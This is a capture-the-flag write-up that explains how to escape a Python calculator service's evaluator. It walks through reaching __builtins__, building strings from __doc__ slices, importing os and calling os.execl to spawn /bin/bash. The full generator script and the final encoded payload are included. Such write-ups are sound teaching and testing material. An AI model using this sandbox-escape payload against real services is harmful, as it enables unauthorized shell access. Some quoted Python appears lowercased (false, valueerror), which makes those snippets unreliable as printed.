# rotaluklak (pwn)

a very nice python exploitation challenge.
we get access to a service and it's [source code](source.py)

the important part of the code is:

```python
    multiply = operator.mul
    divide = operator.div
    idivide = operator.truediv
    add = operator.add
    subtract = operator.sub
    xor = operator.xor
    power = operator.pow
    wumbo = lambda _, x, y: int((str(x) + str(y)) * x)

    def evaluate(self, expr, debug=false):
        expr = expr.split()
        stack = []
        for token in expr:
            try:
                # if the token is a number, push it onto the stack.
                stack.append(int(token))
            except valueerror:
                # this is an operator call the appropriate function
                y = stack.pop()
                x = stack.pop()
                stack.append(operator.attrgetter(token)(self)(x, y))
        return stack[0]
```

the service takes our input, splits tokens by space and then evaluates them as reverse polish notation inputs.
it seems we can only pass integer arguments and call only 2-argument functions from `self`.

there are a couple of important points here:

1. due to how `operator.attrgetter` works we can access properties recursively here - we can pass `x.y.z` to access `self.x.y.z`
2. we can access any property of the `self` object, not only functions we can see in the source code.
3. while arguments we pass directly in input can be only integers, we can place any object on the stack, as long as this object is returned from function we call

as usual in such challenges we try to figure out how to get access to `__builtins__` module and then use `__import__` to get something like `os` or `subprocess`.
there is not much to work with, but there is `wumbo` lambda function, which contains `func_globals` dictionary.
in this dictionary we have `__builtins__` module we want.
the problem is we can't use `['__builtins__']` in `operator.attrgetter` parameter, we can only access direct properties.

our idea is to call `wumbo.func_globals.get` with 2 arguments `__builtins__` and some random integer, which will return the module we want.
now to do this we need to have a string on the stack, so we can use it as an argument.

we will need more strings, so it's a good idea to make a function which can create arbitrary strings on the stack.
to achieve this we will use `__doc__.__getslice__`.
it's quite obvious the intended way, because `__doc__` contains all possible characters.
we use `__getslice__` for simplicity, as it actually takes 2 arguments.

so to get some letters on the stack we can just use payload `x y __getslice__` and the evaluator will place `__doc__[x:y]` on the stack.
of course there are no whole words we need in the docstring, so we'll have to combine those from single letters.
in order to combine them we can just use `add` function.
so if we do:

`x y __getslice__ z v __getslice__ add`

we will get word `__doc__[x:y]+__doc__[z:v]` on the stack.
the final function is just:


```python
def string_generator(payload):
    result = []
    c = calculator()
    data = c.__doc__
    for character in payload:
        index = data.index(character)
        result.append((str(index), str(index + 1), "__doc__.__getslice__"))
    result.append(('add',) * (len(payload) - 1))
    return " ".join([" ".join([y for y in x]) for x in result])
```

now back to our initial problem - we want to get `__builtins__` module.
since we can genrate strings now, we can just send payload `string_generator("__builtins__")+' 1 wumbo.func_globals.get'` and voila, we get module on the stack.

now the problem is, how can we use this?
again, the function to call or properties to extract can come only from `self`.
fortunately python allows to monkey-patch anything, so we can just create a new property on object `self` using `self.__setattr__` function.
this functions requires 2 arguments - name of the property and value.

so we can chain this with our previous payload to get:

```python
string_generator("b")+' '+string_generator("__builtins__")+' 1 wumbo.func_globals.get  __setattr__ '
```

and this will create a new property `b` on object `self` and assign the `__builtins__` module there. 
downside of this, is that setattr pushes none on the stack, and from now on we won't get echo, since top of the stack will be none.
property is there, we can do `b.__import__` to access import function.

we can call this function on some module we want, for example `os` to get this module on the stack again.

```python
string_generator("b")+' '+string_generator("__builtins__")+' 1 wumbo.func_globals.get __setattr__ '+string_generator("os")+' 1 b.__import__')
```

again we need to assign this module to some property in order to be able to access it, so we do:

```python
string_generator("b")+' '+string_generator("__builtins__")+' 1 wumbo.func_globals.get  __setattr__ '+string_generator("s")+ ' '+string_generator("os")+' 1 b.__import__ __setattr__')
```

and voila, we have `os` module set as `self.s` property.

we want to call `os.execl("/bin/bash","x")`, so what we do is simply place two strings as arguments on the stack and then call the function:

```python
string_generator("b")+' '+string_generator("__builtins__")+' 1 wumbo.func_globals.get  __setattr__ '+string_generator("s")+ ' '+string_generator("os")+' 1 b.__import__ __setattr__ '+ string_generator("/bin/bash") + ' ' + string_generator("x") + ' s.execl'
```

this gives us the final payload of:

```
358 359 __doc__.__getslice__  1772 1773 __doc__.__getslice__ 1772 1773 __doc__.__getslice__ 358 359 __doc__.__getslice__ 93 94 __doc__.__getslice__ 81 82 __doc__.__getslice__ 91 92 __doc__.__getslice__ 96 97 __doc__.__getslice__ 81 82 __doc__.__getslice__ 120 121 __doc__.__getslice__ 82 83 __doc__.__getslice__ 1772 1773 __doc__.__getslice__ 1772 1773 __doc__.__getslice__ add add add add add add add add add add add 1 wumbo.func_globals.get  __setattr__ 82 83 __doc__.__getslice__  97 98 __doc__.__getslice__ 82 83 __doc__.__getslice__ add 1 b.__import__ __setattr__ 1787 1788 __doc__.__getslice__ 358 359 __doc__.__getslice__ 81 82 __doc__.__getslice__ 120 121 __doc__.__getslice__ 1787 1788 __doc__.__getslice__ 358 359 __doc__.__getslice__ 87 88 __doc__.__getslice__ 82 83 __doc__.__getslice__ 80 81 __doc__.__getslice__ add add add add add add add add 112 113 __doc__.__getslice__  s.execl
```

whe we send this payload to the server, we will invoke `os.execl("/bin/bash","x")` and therefore gain shell.
we can just cat the flag there: `flag:r3vers3_p0lish_expl01ts!`

initially we wanted to use `subprocess.check_output()` instead of `os.execl()`, but as mentioned earlier `setattr` places none on the stack, and therefore the result of the command is not on the top, and we can't see it.
it was easier to use `os.execl()` than to figure out how to pop those nones, or how to start a reverse shell on the target machine.
